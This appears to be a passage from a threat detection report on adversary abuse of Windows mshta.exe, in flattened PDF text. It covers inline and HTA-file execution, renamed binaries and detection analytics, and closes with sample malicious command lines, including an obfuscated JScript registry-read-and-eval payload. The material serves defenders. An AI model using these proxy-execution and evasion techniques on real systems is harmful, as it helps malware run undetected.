through a trusted utility.AnalysisWhy do adversaries use Mshta?Mshta.exe is a Windows\-native binary designed to execute Microsoft HTMLApplication (HTA) files. As its full name implies, Mshta can execute WindowsScript Host code (VBScript and JScript) embedded within HTML in a networkproxy\-aware fashion. These capabilities make Mshta an appealing vehicle foradversaries to proxy execution of arbitrary script code through a trusted, signedutility, making it a reliable technique during both initial and later stages of aninfection.How do adversaries use Mshta?There are four primary methods by which adversaries leverage Mshta to executearbitrary VBScript and JScript:inline via an argument passed in the command line to Mshtafile\-based execution via an HTML Application (HTA) file and COM\-basedexecution for lateral movementby calling the RunHTMLApplication export function of mshtml.dll withrundll32\.exe as an alternative to mshta.exeThe two most commonly abused Mshta technique variations we observed in2020 were inline and file\-based execution.Inline execution of code doesnt require the adversary to write additional filesto disk. VBScript or JScript can be passed directly to Mshta via the commandline for execution. This behavior gained notoriety several years ago with Kovtermalware, remnants of which we still observed in 2020 despite this threatvanishing from the landscape following the 2018 indictment and arrest of theoperators. Heres an example of Kovter persistence in action:26l T1218\.005: Mshta2021 Threat Detection ReportUrsnif has used similar inline execution combined with code stored in theregistry as part of its multistage initial access. Zscaler put out a great reportdetailing Ursnifs technique shift from PowerShell to Mshta. Notice the use ofActiveXObject and regread in both the Kovter example above and the Ursnifexample below. Key terms like these make for reliable detection logic and are agood indication that Mshta is being mischievous.Conversely, some adversaries choose to execute code stored in a file.Adversaries can direct Mshta to execute HTA content stored in a local or remotefile by passing a location on disk, a URI, or a Universal Naming Convention (UNC)path (i.e a path prefixed with that points to a file share or hosted WebDAVserver) to the file in the command line. This technique is popular because themalicious payload is not directly visible in the command line, as it is with inlineexecution, and permits the execution of remotely hosted HTA content in aproxy\-aware fashion. One threat we observed leveraging this technique in 2020dropped Remcos via HTA content hidden behind a shortened URL:27l T1218\.005: MshtaT 1 2 1 8 . 0 0 5 : 
MSHT AAdversaries may abuse mshta.exe toproxy execution of malicious .hta filesand Javascript or VBScript througha trusted Windows utility. There areseveral examples of different types ofthreats leveraging mshta.exe duringinitial compromise and for execution ofcode. Mshta.exe is a utility that executesMicrosoft HTML Applications (HTA) files.HTAs are standalone applications thatexecute using the same models andtechnologies of Internet Explorer, butoutside of the browser.2021 Threat Detection ReportEmerging Mshta tradecraftAdversaries know that defenders are aware of Mshtas potential for abuse.Therefore, its no surprise that in 2020 we observed an increase in adversarytechniques to disguise Mshta execution and evade brittle detection logic. TheAgent Tesla, Azorult, Lockbit, Lokibot, and Ursnif malware families all used inlineexecution of VBScript or JScript, or file\-based execution of HTA content in filesthat did not have the commonly associated .hta file extension. This is becauseMshta will execute HTA content in files with any extension (or none at all) as longas the file extension is not mapped to a textplain MIME type (e.g Mshta will notexecute a file with a .txt extension). To further disguise Mshta execution, TA551renamed the binary in attempts to evade detection logic, which relied on Mshtaexecuting with its expected filename of mshta.exe.Detection 
Collection requirementsProcess and command\-line monitoringMonitoring process execution and command\-line parameters will offerdefenders visibility into many behaviors associated with malicious abuse ofMshta. Similarly, process lineage is also helpful for detecting adversary use ofMshta. At a minimum, collect parent\-child process relationships, and, if possible,consider collecting information about grandparent relationships too.Process metadataWe observed multiple adversaries this year renaming the Mshta binary toevade brittle detection logic. While we cover this extensively in our analysisof T1036\.003: Rename System Utilities, binary metadata like internal processnames are an effective data source to determine the true identity of agiven process.File monitoring and
network connectionsFile monitoring and network connectionssometimes used in conjunction withone anotherare also useful data sources for defenders seeking to observepotentially malicious Mshta abuse.28l T1218\.005: Mshta2021 Threat Detection ReportDetection suggestionsTwo fundamental and complementary ways that you can think about detectionfor a given technique are to:1\.Build analytics around the ways youve observed or otherwise know thatadversaries have leveraged a technique in the past2\.Identify all of the possible variations in the way a technique can beleveraged, a process discussed in detail in this blog post, and developmethods for detecting variations that deviate from what you expectIn our experience, its best to combine these two strategies while settingpriorities that ensure that you have sufficient coverage against actualized threatsin the wild.Inline script execution and
protocol handlersMshta permits a user to execute inline Windows Script Host (WSH) script code(i.e VBScript and JScript). The way that Mshta then interprets that code isdependent on the specified protocol handle, which is a component of Windowsthat tells the operating system how to parse and interpret protocol paths (e.ghttp:, ftp:, javascript:, vbscript:, about:, etc.).Defenders can build detection analytics for inline Mshta script execution aroundthese protocol handlers appearing in the command line. A specific detectionexample for this would be to look for the execution of mshta.exe in conjunctionwith a command line containing any of the protocol handlers that are relevant toMshta: javascript, vbscript, or about, to name a few options. The following offersan example of what that might look like in the wild:vbscript:CreateObject(WScript.Shell).Run(notepad.exe)(window.close)javascript:dxdkDS\=kd54s;djd3\=newActiveXObject(WScript.Shell);vs3skdk\=dK3;sdfkl3\=djd3\. RegRead(HKCUsoftwareklkndk32lk);esllnb3\=3m3d;eval(asdfkl2\);dkn3\=dks;about:about: